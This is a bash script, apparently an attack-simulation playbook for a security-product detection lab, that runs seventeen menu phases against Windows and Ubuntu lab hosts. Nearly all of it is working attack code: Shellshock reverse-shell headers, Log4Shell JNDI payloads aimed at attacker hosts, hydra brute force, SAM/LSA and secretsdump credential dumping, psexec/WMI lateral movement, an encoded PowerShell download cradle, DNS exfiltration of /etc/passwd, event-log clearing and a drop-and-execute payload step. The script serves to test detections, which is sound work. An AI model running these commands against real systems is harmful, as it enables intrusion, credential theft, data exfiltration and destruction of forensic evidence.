#!/bin/bash
# TrendAI Enablement Lab — Attack Playbook

export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:$PATH

source /opt/lab/lab.conf
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

banner() {
  clear
  echo -e "${BLUE}${BOLD}"
  echo "  ╔══════════════════════════════════════════════════════╗"
  echo "  ║       TrendAI Enablement Lab — Attack Playbook       ║"
  echo "  ╚══════════════════════════════════════════════════════╝"
  echo -e "${NC}"
  echo -e "  Targets: ${YELLOW}Windows${NC} $WIN_IP  |  ${YELLOW}Ubuntu-1${NC} $U1_IP  |  ${YELLOW}Ubuntu-2${NC} $U2_IP"
  echo ""
}

hdr() {
  echo -e "\n${CYAN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${GREEN}${BOLD}  PHASE $1 — $2${NC}"
  echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

ok()   { echo -e "${GREEN}[+]${NC} $*"; }
info() { echo -e "${YELLOW}[*]${NC} $*"; }
err()  { echo -e "${RED}[!]${NC} $*"; }
need() { command -v "$1" &>/dev/null || { err "$1 not found — skipping"; return 1; }; }

phase1() {
  hdr 1 "Network Discovery"
  info "Port scan — top 1000 ports on all VPC2 targets..."
  nmap -Pn -sV --top-ports 1000 $WIN_IP $U1_IP $U2_IP
}

phase2() {
  hdr 2 "Deep Vulnerability Scan"

  info "[2.1] SMB vuln suite — MS17-010, MS08-067, MS06-025, MS07-029, signing..."
  nmap -Pn -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-cve2009-3103,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-security-mode,smb2-security-mode,smb-enum-shares,smb-enum-users --script-args unsafe=1 $WIN_IP

  info "[2.2] RDP vulns — BlueKeep (CVE-2019-0708), MS12-020, encryption audit..."
  nmap -Pn -p 3389 \
    --script rdp-vuln-ms12-020,rdp-enum-encryption \
    --script-args unsafe=1 \
    $WIN_IP

  info "[2.3] DCERPC / RPC endpoint enumeration (Windows)..."
  nmap -Pn -p 135 --script msrpc-enum $WIN_IP || true

  info "[2.4] NetBIOS and SMB OS discovery sweep..."
  nmap -Pn -p 137,138,139 --script nbstat,smb-os-discovery $WIN_IP

  info "[2.5] WinRM / HTTP service probes (Windows)..."
  nmap -Pn -p 5985,5986,80,443,8080 \
    --script http-auth-finder,http-methods,http-title \
    $WIN_IP || true

  info "[2.6] SSH deep audit on Ubuntu hosts..."
  nmap -Pn -p 22 \
    --script ssh-auth-methods,ssh2-enum-algos,ssh-hostkey \
    $U1_IP $U2_IP

  info "[2.7] Shellshock probe (CVE-2014-6271) on Ubuntu hosts..."
  nmap -Pn -p 80,443,8080,8443 \
    --script http-shellshock \
    --script-args uri=/cgi-bin/test.cgi \
    $U1_IP $U2_IP || true
  curl -s --max-time 5 -H 'User-Agent: () { :;}; echo; echo; /bin/bash -i >& /dev/tcp/10.0.1.1/4444 0>&1' \
    http://$U1_IP/ -o /dev/null || true
  curl -s --max-time 5 -H 'User-Agent: () { :;}; echo; echo; /bin/bash -i >& /dev/tcp/10.0.1.1/4444 0>&1' \
    http://$U2_IP/ -o /dev/null || true

  info "[2.8] Heartbleed (CVE-2014-0160) TLS probe on all targets..."
  nmap -Pn -p 443,8443 --script ssl-heartbleed $WIN_IP $U1_IP $U2_IP || true

  info "[2.9] Apache Struts RCE probe (CVE-2017-5638) on Ubuntu-2..."
  curl -s --max-time 5 \
    -H 'Content-Type: %{(#_="multipart/form-data")}' \
    http://$U2_IP:8080/ -o /dev/null || true

  info "[2.10] Full NSE vuln category scan on Windows (broad signature sweep)..."
  nmap -Pn -p 80,135,139,443,445,3389,5985 --script vuln \
    --script-args unsafe=1 \
    $WIN_IP 2>&1 | grep -E "VULNERABLE|CVE|State|open" | head -30 || true

  ok "Phase 2 complete — DDI should log exploit probes, vuln scans, and suspicious HTTP payloads"
}

phase3() {
  hdr 3 "SMB Enumeration — Null Session"
  need nxc || return 1
  info "Null session share enum on Windows..."
  nxc smb $WIN_IP --shares -u '' -p ''
  info "SMB fingerprint..."
  nxc smb $WIN_IP
  info "RPC user enum..."
  nxc smb $WIN_IP --users -u '' -p '' || true
}

phase4() {
  hdr 4 "Brute Force — SSH (Ubuntu), SMB (Windows), RDP (Windows)"
  need hydra || return 1
  [ -f /usr/share/wordlists/rockyou.txt ] || { err "rockyou.txt missing — run: gunzip /usr/share/wordlists/rockyou.txt.gz"; return 1; }

  info "[4.1] SSH brute force on Ubuntu-1 (stops at first hit)..."
  hydra -l $LAB_USER -P /usr/share/wordlists/rockyou.txt ssh://$U1_IP -t 4 -f -V 2>&1 | head -60

  info "[4.2] SSH brute force on Ubuntu-2..."
  hydra -l $LAB_USER -P /usr/share/wordlists/rockyou.txt ssh://$U2_IP -t 4 -f -V 2>&1 | head -30

  info "[4.3] SMB brute force on Windows — generates Security event ID 4625 (failed logon)..."
  hydra -l $LAB_USER -P /usr/share/wordlists/rockyou.txt smb://$WIN_IP -t 1 -V 2>&1 | head -40
  need nxc && nxc smb $WIN_IP -u Administrator -p /usr/share/wordlists/rockyou.txt --no-bruteforce 2>&1 | head -20 || true

  info "[4.4] RDP brute force on Windows — generates Security event ID 4625 and TerminalServices-RemoteConnectionManager events..."
  hydra -l $LAB_USER -P /usr/share/wordlists/rockyou.txt rdp://$WIN_IP -t 1 -V 2>&1 | head -40
  hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://$WIN_IP -t 1 -V 2>&1 | head -20

  ok "Phase 4 complete — Log Inspection should detect repeated failed logons on SMB and RDP (Event IDs 4625, 4771, 131)"
}

phase5() {
  hdr 5 "SMB Auth Execution + SAM/LSA Dump — Windows"
  need nxc || return 1
  info "Authenticated share enum..."
  nxc smb $WIN_IP -u $LAB_USER -p "$LAB_PASS" --shares
  info "smbexec — whoami /priv..."
  nxc smb $WIN_IP -u $LAB_USER -p "$LAB_PASS" --exec-method smbexec -x "whoami /priv"
  info "smbexec — net user..."
  nxc smb $WIN_IP -u $LAB_USER -p "$LAB_PASS" --exec-method smbexec -x "net user"
  info "Dumping SAM database..."
  nxc smb $WIN_IP -u $LAB_USER -p "$LAB_PASS" --sam || true
  info "Dumping LSA secrets..."
  nxc smb $WIN_IP -u $LAB_USER -p "$LAB_PASS" --lsa || true
}

phase6() {
  hdr 6 "WMI Remote Execution + Suspicious PowerShell — Windows"
  need wmiexec.py || return 1
  info "wmiexec — whoami /all..."
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "whoami /all" 2>&1 | head -20
  info "wmiexec — tasklist..."
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "tasklist" 2>&1 | head -20
  info "wmiexec — encoded PowerShell download cradle (IEX stager)..."
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP \
    "powershell -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAA4AC4AMQAxADYALgA3AC4AMQA4ADYALwBzAHQAYQBnAGUAcgAnACkA" \
    2>&1 | head -10 || true
}

phase7() {
  hdr 7 "PSExec Lateral Movement — Windows"
  need psexec.py || return 1
  info "PSExec service install + remote execution (highly detectable)..."
  echo "hostname && whoami && ipconfig" | timeout 30 psexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP cmd.exe 2>&1 | head -25 || true
}

phase8() {
  hdr 8 "Credential Harvesting — secretsdump"
  need secretsdump.py || return 1
  info "Dumping all credentials from Windows (SAM / LSA / cached)..."
  secretsdump.py $LAB_USER:"$LAB_PASS"@$WIN_IP 2>&1 | head -60
}

phase9() {
  hdr 9 "EternalBlue Probe — MS17-010"
  info "NSE vuln scan for MS17-010..."
  nmap -Pn -p 445 --script smb-vuln-ms17-010 --script-args unsafe=1 $WIN_IP
  info "Metasploit MS17-010 scanner (generates distinctive SMB probe traffic)..."
  msfconsole -q -x \
    "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $WIN_IP; set THREADS 1; run; exit" \
    2>&1 | grep -E "VULNERABLE|not vuln|Error|Host|patch" | head -10 || true
}

phase10() {
  hdr 10 "Log4Shell Exploit — CVE-2021-44228 (Ubuntu-2 Vulhub)"
  info "Starting vulnerable Log4Shell container on $U2_IP..."
  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 $LAB_USER@$U2_IP \
    "cd /opt/lab/vulhub/log4j/CVE-2021-44228 && docker compose up -d" 2>&1 || \
    { err "SSH to Ubuntu-2 failed"; return 1; }
  info "Waiting 25s for container to start..."
  sleep 25
  info "Sending Log4Shell JNDI injection payloads across multiple headers..."
  J1=$(printf '\x24{jndi:ldap://169.254.169.254/latest/meta-data/}')
  J2=$(printf '\x24{jndi:dns://burpcollaborator.net/log4shell-poc}')
  J3=$(printf '\x24{jndi:ldap://attacker.evil.com:1389/Exploit}')
  J4=$(printf '\x24{jndi:rmi://10.0.1.1:1099/obj}')
  curl -s "http://$U2_IP:8080/"       -H "X-Api-Version: $J1"   -o /dev/null
  curl -s "http://$U2_IP:8080/"       -H "User-Agent: $J2"      -o /dev/null
  curl -s "http://$U2_IP:8080/index"  -H "X-Forwarded-For: $J3" -o /dev/null
  curl -s "http://$U2_IP:8080/login"  -H "Authorization: $J4"   -o /dev/null
  curl -s "http://$U2_IP:8080/" -d "username=$J3&password=test"  -o /dev/null || true
  ok "Log4Shell payloads sent — check DDI for exploit attempt detections"
}

phase11() {
  hdr 11 "East-West Lateral Movement — Ubuntu-2 to Windows and Ubuntu-1"
  info "Pivoting through Ubuntu-2 to attack Windows and Ubuntu-1 from inside VPC2..."
  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 $LAB_USER@$U2_IP bash -s <<PIVOT
echo "[U2->WIN] SMB exec via nxc..."
nxc smb $WIN_IP -u $LAB_USER -p '$LAB_PASS' --exec-method smbexec -x "whoami /all" 2>&1 || true
echo "[U2->WIN] WMI exec via wmiexec..."
wmiexec.py $LAB_USER:'$LAB_PASS'@$WIN_IP "tasklist" 2>&1 | head -15 || true
echo "[U2->WIN] secretsdump..."
secretsdump.py $LAB_USER:'$LAB_PASS'@$WIN_IP 2>&1 | head -20 || true
echo "[U2->U1] SSH lateral with sshpass..."
sshpass -p '$LAB_PASS' ssh -o StrictHostKeyChecking=no $LAB_USER@$U1_IP \
  "id; hostname; nmap -Pn --top-ports 20 $WIN_IP 2>/dev/null" 2>&1 || true
PIVOT
}

phase12() {
  hdr 12 "C2 Beacon Simulation — Ubuntu-1"
  info "Simulating periodic C2 beaconing from compromised Ubuntu-1 (6 beacons, 10s apart)..."
  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 $LAB_USER@$U1_IP bash -s <<'BEACON'
for i in $(seq 1 6); do
  echo "[beacon $i/6] $(date -u)"
  curl -s --max-time 5 http://185.220.101.1/beacon \
    -d "id=$(hostname)&u=$(whoami)&seq=$i" -o /dev/null 2>/dev/null || true
  curl -s --max-time 5 https://pastebin.com/raw/AAAAAAAAAA \
    -o /dev/null 2>/dev/null || true
  sleep 10
done
echo "[*] Beacon simulation complete"
BEACON
}

phase13() {
  hdr 13 "DNS Exfiltration Simulation — Ubuntu-1"
  info "Simulating DNS-based data exfiltration from compromised Ubuntu-1..."
  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 $LAB_USER@$U1_IP bash -s <<'DNSEXFIL'
PAYLOAD=$(cat /etc/passwd | base64 | tr -d '\n= ')
PAYLOAD_LEN=$(printf '%s' "$PAYLOAD" | wc -c)
CHUNK_SIZE=50
OFFSET=0
COUNT=1
while [ $OFFSET -lt $PAYLOAD_LEN ]; do
  CHUNK=$(printf '%s' "$PAYLOAD" | cut -c$((OFFSET+1))-$((OFFSET+CHUNK_SIZE)))
  dig +short "$COUNT.$CHUNK.exfil.c2attacker.evil" A @8.8.8.8 >/dev/null 2>&1 || true
  echo "[DNS exfil] chunk $COUNT sent"
  OFFSET=$((OFFSET + CHUNK_SIZE))
  COUNT=$((COUNT + 1))
  sleep 2
done
echo "[*] DNS exfil complete — $COUNT chunks sent"
DNSEXFIL
}

phase14() {
  hdr 14 "Anti-Forensics — Hosts File Tampering + Event Log Clearing (Windows)"
  need wmiexec.py || return 1

  info "[14.1] Appending rogue entries to Windows hosts file (DNS hijack simulation)..."
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "cmd /c echo 10.0.1.100 windowsupdate.microsoft.com >> C:\Windows\System32\drivers\etc\hosts" 2>&1 | head -5 || true
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "cmd /c echo 10.0.1.100 update.microsoft.com >> C:\Windows\System32\drivers\etc\hosts" 2>&1 | head -5 || true
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "cmd /c echo 10.0.1.100 crl.microsoft.com >> C:\Windows\System32\drivers\etc\hosts" 2>&1 | head -5 || true
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "cmd /c type C:\Windows\System32\drivers\etc\hosts" 2>&1 | head -20

  info "[14.2] Clearing all Windows Event Logs (anti-forensics — triggers Integrity Monitoring)..."
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "wevtutil cl System" 2>&1 | head -5 || true
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "wevtutil cl Security" 2>&1 | head -5 || true
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "wevtutil cl Application" 2>&1 | head -5 || true
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "wevtutil cl Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational" 2>&1 | head -5 || true
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "wevtutil cl Microsoft-Windows-Sysmon/Operational" 2>&1 | head -5 || true
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "powershell -Command \"Get-WinEvent -ListLog * | Where-Object { \$_.RecordCount -gt 0 } | ForEach-Object { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\$_.LogName) }\"" 2>&1 | head -10 || true

  info "[14.3] Verifying logs are cleared..."
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "wevtutil gli System" 2>&1 | grep -i "number\|record" | head -5 || true
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "wevtutil gli Security" 2>&1 | grep -i "number\|record" | head -5 || true

  ok "Phase 14 complete — Integrity Monitoring should alert on hosts file change; Log Inspection should detect audit log cleared (Event ID 1102)"
}

run_all() {
  echo -e "\n${RED}${BOLD}[!] Running ALL 14 phases — $DELAYs between each. Ctrl+C to abort.${NC}\n"
  sleep 3
  phase1;  echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase2;  echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase3;  echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase4;  echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase5;  echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase6;  echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase7;  echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase8;  echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase9;  echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase10; echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase11; echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase12; echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase13; echo -e "\n${CYAN}[*] Waiting $DELAYs...${NC}"; sleep $DELAY
  phase14
  echo -e "\n${GREEN}${BOLD}[✓] All phases complete. Review DDI detections dashboard.${NC}\n"
}

phase15() {
  hdr 15 "Custom Payload — Drop and Execute on Windows"

  read -rp "  Paste URL of executable to drop on Windows: " PAYLOAD_URL
  [ -z "$PAYLOAD_URL" ] && { err "No URL provided."; return 1; }

  read -rp "  Filename to use on target [default: payload.exe]: " PAYLOAD_NAME
  [ -z "$PAYLOAD_NAME" ] && PAYLOAD_NAME="payload.exe"

  LOCAL_PATH="/tmp/$PAYLOAD_NAME"
  REMOTE_DIR='C:\Windows\Temp'
  REMOTE_PATH="$REMOTE_DIR\\$PAYLOAD_NAME"

  info "Downloading from $PAYLOAD_URL..."
  curl -fsSL "$PAYLOAD_URL" -o "$LOCAL_PATH" || { err "Download failed — check URL and connectivity"; return 1; }
  ok "Saved to $LOCAL_PATH ($(du -h $LOCAL_PATH | cut -f1))"

  info "Uploading $PAYLOAD_NAME to $REMOTE_DIR on Windows via SMB (C$)..."
  nxc smb $WIN_IP -u $LAB_USER -p "$LAB_PASS" --put-file "$LOCAL_PATH" "\\Windows\\Temp\\$PAYLOAD_NAME" 2>&1 || \
    smbclient.py $LAB_USER:"$LAB_PASS"@$WIN_IP -c "use C\$; cd Windows\Temp; put $LOCAL_PATH $PAYLOAD_NAME" 2>&1 || \
    { err "Upload failed — check SMB access"; return 1; }
  ok "File dropped to $REMOTE_PATH"

  info "Executing $PAYLOAD_NAME on Windows via WMI (detached process)..."
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "cmd /c start /b $REMOTE_PATH" 2>&1 | head -10 || true

  ok "Payload launched — monitor Vision One > Endpoint Security and DDI > Detected Threats"
}

phase16() {
  hdr 16 "EICAR Anti-Malware Test — Drop to Windows via SMB"
  info "Writing EICAR test file locally..."
  printf 'X5O!P%%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.com
  ok "EICAR file created at /tmp/eicar.com"

  info "Uploading eicar.com to C:\\Windows\\Temp on Windows via SMB..."
  nxc smb $WIN_IP -u $LAB_USER -p "$LAB_PASS" --put-file /tmp/eicar.com '\\Windows\\Temp\\eicar.com' 2>&1 || \
    smbclient.py $LAB_USER:"$LAB_PASS"@$WIN_IP -c 'use C$; cd Windows\Temp; put /tmp/eicar.com eicar.com' 2>&1 || \
    { err "Upload failed"; return 1; }
  ok "EICAR dropped to C:\\Windows\\Temp\\eicar.com"

  info "Triggering file access via WMI to force AV scan..."
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "cmd /c type C:\\Windows\\Temp\\eicar.com" 2>&1 | head -5 || true

  info "Also dropping EICAR to Ubuntu-1 and Ubuntu-2 home directories..."
  sshpass -p "$LAB_PASS" ssh -o StrictHostKeyChecking=no $LAB_USER@$U1_IP "printf 'X5O!P%%@AP[4\\\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*' > ~/eicar.com" 2>&1 || true
  sshpass -p "$LAB_PASS" ssh -o StrictHostKeyChecking=no $LAB_USER@$U2_IP "printf 'X5O!P%%@AP[4\\\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*' > ~/eicar.com" 2>&1 || true

  ok "Phase 16 complete — Vision One Anti-Malware should alert on EICAR detection across all 3 targets"
}

phase17() {
  hdr 17 "Ransomware Behavior Simulator — Windows (PowerShell IOCs)"
  need wmiexec.py || return 1

  info "Uploading ransomware simulator script to Windows via SMB..."
  nxc smb $WIN_IP -u $LAB_USER -p "$LAB_PASS" --put-file /opt/lab/ransom_sim.ps1 '\\Windows\\Temp\\ransom_sim.ps1' 2>&1 || \
    smbclient.py $LAB_USER:"$LAB_PASS"@$WIN_IP -c 'use C$; cd Windows\Temp; put /opt/lab/ransom_sim.ps1 ransom_sim.ps1' 2>&1 || \
    { err "Upload failed"; return 1; }
  ok "Script dropped to C:\\Windows\\Temp\\ransom_sim.ps1"

  info "Executing ransomware simulator via WMI (PowerShell, Exec Bypass)..."
  wmiexec.py $LAB_USER:"$LAB_PASS"@$WIN_IP "powershell -NoP -NonI -W Hidden -Exec Bypass -File C:\\Windows\\Temp\\ransom_sim.ps1" 2>&1 | head -20 || true

  ok "Phase 17 complete — Vision One should alert on: shadow copy deletion, registry persistence, mass file rename, suspicious PowerShell, and C2 callback"
}

menu() {
  while true; do
    banner
    echo -e "  ${BOLD}Select a phase:${NC}\n"
    echo -e "  ${GREEN} 1${NC}  Network Discovery (nmap)"
    echo -e "  ${GREEN} 2${NC}  Deep Vulnerability Scan (NSE scripts)"
    echo -e "  ${GREEN} 3${NC}  SMB Null Session Enumeration"
    echo -e "  ${GREEN} 4${NC}  Brute Force — SSH (Ubuntu), SMB + RDP (Windows)"
    echo -e "  ${GREEN} 5${NC}  SMB Auth Exec + SAM/LSA Dump — Windows"
    echo -e "  ${GREEN} 6${NC}  WMI Exec + Suspicious PowerShell — Windows"
    echo -e "  ${GREEN} 7${NC}  PSExec Lateral Movement — Windows"
    echo -e "  ${GREEN} 8${NC}  Credential Harvesting (secretsdump)"
    echo -e "  ${GREEN} 9${NC}  EternalBlue Probe (MS17-010)"
    echo -e "  ${GREEN}10${NC}  Log4Shell Exploit (CVE-2021-44228)"
    echo -e "  ${GREEN}11${NC}  East-West Lateral: Ubuntu-2 to Windows + Ubuntu-1"
    echo -e "  ${GREEN}12${NC}  C2 Beacon Simulation — Ubuntu-1"
    echo -e "  ${GREEN}13${NC}  DNS Exfiltration Simulation — Ubuntu-1"
    echo -e "  ${GREEN}14${NC}  Anti-Forensics — Hosts File Tamper + Event Log Clearing"
    echo -e "  ${GREEN}15${NC}  Custom Payload — Drop and Execute on Windows (interactive)"
    echo -e "  ${GREEN}16${NC}  EICAR Anti-Malware Test — Drop to all 3 targets"
    echo -e "  ${GREEN}17${NC}  Ransomware Behavior Simulator — Windows PowerShell IOCs"
    echo ""
    echo -e "  ${RED}${BOLD}A${NC}   Run ALL phases 1-14 sequentially ($DELAYs delay between each)"
    echo -e "  ${YELLOW}Q${NC}   Quit"
    echo ""
    read -rp "  Enter selection: " sel
    echo ""
    case "$sel" in
       1) phase1  ;;  2) phase2  ;;  3) phase3  ;;  4) phase4  ;;
       5) phase5  ;;  6) phase6  ;;  7) phase7  ;;  8) phase8  ;;
       9) phase9  ;; 10) phase10 ;; 11) phase11 ;; 12) phase12 ;;
      13) phase13 ;; 14) phase14 ;; 15) phase15 ;;
      16) phase16 ;; 17) phase17 ;;
      [Aa]) run_all ;;
      [Qq]) echo -e "${YELLOW}Exiting.${NC}"; exit 0 ;;
      *) err "Invalid selection." ;;
    esac
    echo -e "\n${CYAN}Press Enter to return to menu...${NC}"
    read -r
    clear
  done
}

clear
menu
